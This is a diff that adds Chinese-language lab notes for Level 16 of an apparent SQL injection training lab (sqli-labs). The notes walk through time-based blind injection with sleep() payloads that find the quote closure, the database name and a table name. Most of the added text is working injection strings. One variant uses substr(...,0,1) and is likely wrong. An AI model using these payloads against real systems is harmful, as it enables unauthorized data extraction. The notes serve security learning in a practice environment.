@@ -1961,3 +1961,98 @@ admin' and if(left((select table_name from information_schema.tables where table
 
 
 + 一个个测太麻烦，这里就不测下去了，知道可以使用时间盲注就行
+
+
+
+### Level-16 时间盲注
+
++ 首先进入第十六关页面
+
+![Less-16_1](./img/Less-16_1.PNG)
+
+
+
++ 注入<code>1</code>、<code>1'</code>、<code>1"</code>，无法正确闭合
+
+![Less-16_2](./img/Less-16_2.PNG)
+
+
+
++ 注入<code>1")</code>正确闭合<code>sql</code>语句
+
+~~~ shell
+1") or 1=1 #
+~~~
+
+![Less-16_3](./img/Less-16_3.PNG)
+
+返回了正确页面，由上边返回错误页面这里返回正确页面由此可尝试布尔盲注或时间盲注
+
+
+
++ 判断是否有延时
+
+~~~ shell
+admin") and sleep(5) #
+~~~
+
+由于<code>1</code>不行没有反应所以<code>admin</code>代替<code>1</code>，而且只能是<code>admin</code>其他字符没有反应
+
+![Less-16_4](./img/Less-16_4.PNG)
+
+页面有延时，则时间盲注可用
+
+
+
++ 爆数据库长度
+
+~~~ shell
+admin") and if(length(database())=8,sleep(5),null) #
+~~~
+
+![Less-16_5](./img/Less-16_5.PNG)
+
+页面有延迟，说明数据库名长度是8
+
+
+
++ 爆联合数据库名，从左边第一个字母开始，判断库名第一个字母是不是`s`
+
+~~~ shell
+admin") and if(left(database(),1)='s',sleep(5),null) #
+
+......
+~~~
+
+![Less-16_6](./img/Less-16_6.PNG)
+
+由于页面有延时，因此联合数据库名是"s..."。按照前面十几关的经验，得到的最终结果应该是<code>security</code>
+
+
+
+或者注入如下语句也可，是同样的效果
+
+~~~ shell
+admin") and if(ascii(substr(database(),0,1))=115,1,sleep(5))#
+
+admin") and if((select (substr(database(),1,1))="s") ,sleep(5), null)#
+~~~
+
+
+
++ 爆联合数据表名
+
+~~~ shell
+admin") and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),null)#
+
+......
+~~~
+
+![Less-16_7](./img/Less-16_7.PNG)
+
+页面有延迟，说明联合数据表名的第一个字符是"e"
+
+
+
++ 爆破数据就不写了，都是一样的思路使用时间盲注，利用页面是否有延迟判断返回数据是否正确
+
